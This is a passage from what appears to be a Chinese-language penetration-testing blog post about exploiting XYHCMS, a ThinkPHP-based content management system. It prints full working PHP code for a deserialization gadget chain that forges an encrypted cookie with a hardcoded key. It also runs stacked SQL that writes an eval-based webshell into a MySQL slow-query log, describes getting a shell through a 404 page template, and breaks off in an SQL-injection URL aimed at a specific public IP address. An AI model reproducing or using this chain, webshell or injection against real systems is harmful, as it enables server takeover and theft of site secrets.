class_\">Think</span>\\<span class=\"title class_\">Image</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Imagick</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"variable\">$img</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;img = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Session\\Driver\\Memcache</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Common</span>\\<span class=\"title class_\">Lib</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SysCrypt</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"variable\">$crypt_key</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$crypt_key</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable language_\">$this</span> -&gt; crypt_key = <span class=\"variable\">$crypt_key</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">php_encrypt</span>(<span class=\"params\"><span class=\"variable\">$txt</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">srand</span>((<span class=\"keyword\">double</span>)<span class=\"title function_ invoke__\">microtime</span>() * <span class=\"number\">1000000</span>);</span><br><span class=\"line\">\t   <span class=\"variable\">$encrypt_key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">0</span>,<span class=\"number\">32000</span>));</span><br><span class=\"line\">\t   <span class=\"variable\">$ctr</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>);<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$ctr</span> = <span class=\"variable\">$ctr</span> == <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$encrypt_key</span>) ? <span class=\"number\">0</span> : <span class=\"variable\">$ctr</span>;</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>].(<span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>]^<span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>++]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"built_in\">self</span>::<span class=\"title function_ invoke__\">__key</span>(<span class=\"variable\">$tmp</span>,<span class=\"variable\">$this</span> -&gt; crypt_key));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">php_decrypt</span>(<span class=\"params\"><span class=\"variable\">$txt</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$txt</span> = <span class=\"built_in\">self</span>::<span class=\"title function_ invoke__\">__key</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$txt</span>),<span class=\"variable\">$this</span> -&gt; crypt_key);</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>;<span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$md5</span> = <span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>];</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$txt</span>[++<span class=\"variable\">$i</span>] ^ <span class=\"variable\">$md5</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__key</span>(<span class=\"params\"><span class=\"variable\">$txt</span>,<span class=\"variable\">$encrypt_key</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$encrypt_key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$encrypt_key</span>);</span><br><span class=\"line\">\t   <span class=\"variable\">$ctr</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$ctr</span> = <span class=\"variable\">$ctr</span> == <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$encrypt_key</span>) ? <span class=\"number\">0</span> : <span class=\"variable\">$ctr</span>;</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>] ^ <span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>++];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable language_\">$this</span> -&gt; crypt_key = <span class=\"literal\">null</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_cookie</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$key</span> = <span class=\"string\">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"string\">&#x27;iqQmhxkAU&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$sc</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Common\\Lib\\SysCrypt</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"variable\">$sc</span>-&gt;<span class=\"title function_ invoke__\">php_decrypt</span>(<span class=\"variable\">$name</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$value</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">set_cookie</span>(<span class=\"params\"><span class=\"variable\">$args</span>, <span class=\"variable\">$key</span> = <span class=\"string\">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"string\">&#x27;iqQmhxkAU&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$args</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$sc</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Common\\Lib\\SysCrypt</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"variable\">$sc</span>-&gt;<span class=\"title function_ invoke__\">php_encrypt</span>(<span class=\"variable\">$value</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$value</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Image\\Driver\\Imagick</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">set_cookie</span>(<span class=\"variable\">$b</span>,<span class=\"string\">&#x27;&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;+&#x27;</span>,<span class=\"string\">&#x27;%2B&#x27;</span>,<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>生成序列化参数：</p>\n<p><img src=\"fYTXF1j0zAW7xLY0_XL_3JjJDuz6l9FppNdLwjNsQlU.png\" alt=\"image\"></p>\n<p>发送数据，成功伪造。</p>\n<p><img src=\"E3fk_uE2hgCWH1pNmmWIlQhE-TrBubkoRt-GLGb-P88.png\" alt=\"image\"></p>\n<p>查看结果</p>\n<p><img src=\"PmVtCUB-IQ2Xk_BzDO6xleiXM2H7fHhOjSehl74smIA.png\" alt=\"image\"></p>\n<h3 id=\"反序列化漏洞MySQL日志写shell\"><a href=\"#反序列化漏洞MySQL日志写shell\" class=\"headerlink\" title=\"反序列化漏洞MySQL日志写shell\"></a>反序列化漏洞MySQL日志写shell</h3><p>开启慢查询日志：</p>\n<p><code>set global slow_query_log=1;</code></p>\n<p>指定慢查询日志的位置：</p>\n<p><code>set global slow_query_log_file=&#39;C:/phpstudy_pro/WWW/xyh.com/shell.php&#39;;</code></p>\n<p>生成反序列化，然后构造之后发包请求，成功写入shell，（这里需要注意在一句话木马的变量传参中添加个转义“\\”，不然不能完整写入）</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Db</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">PDO</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Mysql</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$options</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        PDO::<span class=\"variable constant_\">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class=\"literal\">true</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$config</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">&quot;dsn&quot;</span>    =&gt; <span class=\"string\">&quot;mysql:host=localhost;dbname=xyhcms;port=3306&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;username&quot;</span> =&gt; <span class=\"string\">&quot;root&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;password&quot;</span> =&gt; <span class=\"string\">&quot;qweas123&quot;</span></span><br><span class=\"line\">        );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$options</span>   = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$pk</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$data</span> = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$db</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">protected</span> <span class=\"variable\">$poss</span> = <span class=\"string\">&#x27;$_POST[1]&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;db = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Db\\Driver\\Mysql</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;options[<span class=\"string\">&#x27;where&#x27;</span>] = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;pk = <span class=\"string\">&#x27;luoke&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;data[<span class=\"variable language_\">$this</span>-&gt;pk] = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"string\">&quot;table&quot;</span> =&gt; <span class=\"string\">&quot;xyh_admin_log&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;where&quot;</span> =&gt; <span class=\"string\">&quot;id=0;select &#x27;&lt;?php @eval(\\$_POST[1]);?&gt;&#x27; or sleep(11);&quot;</span></span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Session</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Memcache</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$handle</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;handle = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Model</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Image</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Imagick</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"variable\">$img</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;img = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Session\\Driver\\Memcache</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Common</span>\\<span class=\"title class_\">Lib</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SysCrypt</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"variable\">$crypt_key</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$crypt_key</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable language_\">$this</span> -&gt; crypt_key = <span class=\"variable\">$crypt_key</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">php_encrypt</span>(<span class=\"params\"><span class=\"variable\">$txt</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">srand</span>((<span class=\"keyword\">double</span>)<span class=\"title function_ invoke__\">microtime</span>() * <span class=\"number\">1000000</span>);</span><br><span class=\"line\">\t   <span class=\"variable\">$encrypt_key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">0</span>,<span class=\"number\">32000</span>));</span><br><span class=\"line\">\t   <span class=\"variable\">$ctr</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>);<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$ctr</span> = <span class=\"variable\">$ctr</span> == <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$encrypt_key</span>) ? <span class=\"number\">0</span> : <span class=\"variable\">$ctr</span>;</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>].(<span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>]^<span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>++]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"built_in\">self</span>::<span class=\"title function_ invoke__\">__key</span>(<span class=\"variable\">$tmp</span>,<span class=\"variable\">$this</span> -&gt; crypt_key));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">php_decrypt</span>(<span class=\"params\"><span class=\"variable\">$txt</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$txt</span> = <span class=\"built_in\">self</span>::<span class=\"title function_ invoke__\">__key</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$txt</span>),<span class=\"variable\">$this</span> -&gt; crypt_key);</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>;<span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$md5</span> = <span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>];</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$txt</span>[++<span class=\"variable\">$i</span>] ^ <span class=\"variable\">$md5</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__key</span>(<span class=\"params\"><span class=\"variable\">$txt</span>,<span class=\"variable\">$encrypt_key</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$encrypt_key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$encrypt_key</span>);</span><br><span class=\"line\">\t   <span class=\"variable\">$ctr</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$ctr</span> = <span class=\"variable\">$ctr</span> == <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$encrypt_key</span>) ? <span class=\"number\">0</span> : <span class=\"variable\">$ctr</span>;</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>] ^ <span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>++];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable language_\">$this</span> -&gt; crypt_key = <span class=\"literal\">null</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_cookie</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$key</span> = <span class=\"string\">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"string\">&#x27;iqQmhxkAU&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$sc</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Common\\Lib\\SysCrypt</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"variable\">$sc</span>-&gt;<span class=\"title function_ invoke__\">php_decrypt</span>(<span class=\"variable\">$name</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$value</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">set_cookie</span>(<span class=\"params\"><span class=\"variable\">$args</span>, <span class=\"variable\">$key</span> = <span class=\"string\">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"string\">&#x27;iqQmhxkAU&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$args</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$sc</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Common\\Lib\\SysCrypt</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"variable\">$sc</span>-&gt;<span class=\"title function_ invoke__\">php_encrypt</span>(<span class=\"variable\">$value</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$value</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Image\\Driver\\Imagick</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">set_cookie</span>(<span class=\"variable\">$b</span>,<span class=\"string\">&#x27;&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;+&#x27;</span>,<span class=\"string\">&#x27;%2B&#x27;</span>,<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>至此成功在本地window搭建的phpstudy环境getshell</p>\n<p><img src=\"t22_CJfnGW30lPSRUDfvHVW7eMb-apXIZJCG6FufS5A.png\" alt=\"image\"></p>\n<h3 id=\"尝试线上环境\"><a href=\"#尝试线上环境\" class=\"headerlink\" title=\"尝试线上环境\"></a>尝试线上环境</h3><p>当我喜出望外拿这个方法到线上去测试的时候，发现现实是残酷的。</p>\n<p>所有的请求都成功了，但是就是写不进shell。</p>\n<p><img src=\"KRbUGAMappm9vWkUegnjQZ4IYxITmii9VlbjK-SrcLM.png\" alt=\"image\"></p>\n<p><img src=\"uJ8rZ6J9WCZjVo2Tt8hwpxtKmU-0Hbvl_1fQ3MUjQ7I.png\" alt=\"image\"></p>\n<p>于是放弃了，然后打算再重新捋一遍，然后在本地搭建模拟线上的环境。</p>\n<h2 id=\"本地搭建宝塔环境测试\"><a href=\"#本地搭建宝塔环境测试\" class=\"headerlink\" title=\"本地搭建宝塔环境测试\"></a>本地搭建宝塔环境测试</h2><p>使用宝塔搭建完成靶场之后，开始前面的一系列反序列化堆叠注入日志写shell的操作。</p>\n<p>发现也也不进去，看了一下是权限的问题，文件夹改成了777权限之后，成功写入shell</p>\n<p><img src=\"DIQWoMJ_NVZj5nrH-RQxTIVoAzdfQ62PVEvBB6495ZU.png\" alt=\"image\"></p>\n<p>尝试连接，发现没用访问权限</p>\n<p><img src=\"g0QWjEryttjtJuLqTGada2w_u7wKAIvFLTspWp20pAg.png\" alt=\"image\"></p>\n<p>使用chown更改属组之后，才能正常访问，也就是说想通过反序列化堆叠SQL日志写shell是几乎不可能的</p>\n<p><img src=\"G52gO9m7CdHkMk_Wo9KYGDCpw5vZFkgOcqm0s9a7JiI.png\" alt=\"image\"></p>\n<p><img src=\"VFsSqvesJ50Vn2TN92fkr8MqUInV_KZnG41nyF7GtlQ.png\" alt=\"image\"></p>\n<h3 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h3><p>开启伪静态：</p>\n<p><img src=\"f-O0vnvwhniqcVbviV0Zk8EF_yrib_rJn6GCImABAVU.png\" alt=\"image\"></p>\n<p>目前的情况是能够通过反序列化添加管理员进入后台，在本地尝试了多个网上找到的后台getshell都无果，打算开始看看代码有没有新的入口。前面测试写入shell访问的时候，发现会自动加载一会儿，然后跳出404.html页面。</p>\n<p>在后台里面尝试上传的地方，可以添加上传类型txt,html。</p>\n<p>直接查看404.html，查看到嵌入有一些php代码，是获取当前时间的一段代码，也就是说这一个页面极有可能也是可以进行php解析的。</p>\n<p><img src=\"0GsCqcFShva7QmvL2RNG0h6us9HTnuAzEZxy9aeRgnk.png\" alt=\"image\"></p>\n<p>当我尝试改为phpinfo的时候，发现了报错</p>\n<p><img src=\"nqaOpSbz0k2443kllVsDMaymt_GLT7nRQuAoLTz9H08.png\" alt=\"image\"></p>\n<p><img src=\"PFic_qL5EAPqSri-ky1mPd15hIjczPXv593voMBao-Q.png\" alt=\"image\"></p>\n<p>查看了过滤的代码之后，这里过滤了php相关字符的一些危险字符。</p>\n<p><img src=\"N8-whXEcfuPedGBGpLZuaOpBROakgXs9gPf7SyxeCeM.png\" alt=\"image\"></p>\n<p><img src=\"HXlTS7g_bCuW5Y7ViN8w75f9lQpuhHpNFaA76FvBrJk.png\" alt=\"image\"></p>\n<p>这时候尝试通过文件包含的方式去测试，在404.html页面中添加一些语句包含上传的一些代码，尝试解析。</p>\n<p><img src=\"k552jfshUzyTNZKGWI3TWTNlTuA3e6ht9n82PwuqX8Y.png\" alt=\"image\"></p>\n<p><img src=\"8ZKAeFw5nD-b_jmd5S27okLMWTWFcnpaZChBzXFEBLc.png\" alt=\"image\"></p>\n<p>在页面输入一个不存在的文件，尝试访问让其跳转到404.html，然后再包含上传的文件进行解析。</p>\n<p><img src=\"it2DAINURC-mlCZ3V5-y6_UvBnaIjVO3kjeM6BSfbOg.png\" alt=\"image\"></p>\n<p>至此，成功getshell。</p>\n<h1 id=\"外部打点\"><a href=\"#外部打点\" class=\"headerlink\" title=\"外部打点\"></a>外部打点</h1><h2 id=\"SQL注入拿key\"><a href=\"#SQL注入拿key\" class=\"headerlink\" title=\"SQL注入拿key\"></a>SQL注入拿key</h2><p>查询当前key:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//103.121.93.206/index.php/Api/Lt/alist?orderby[updatexml(1,concat(char(126),(select s_value from xyh_config limit 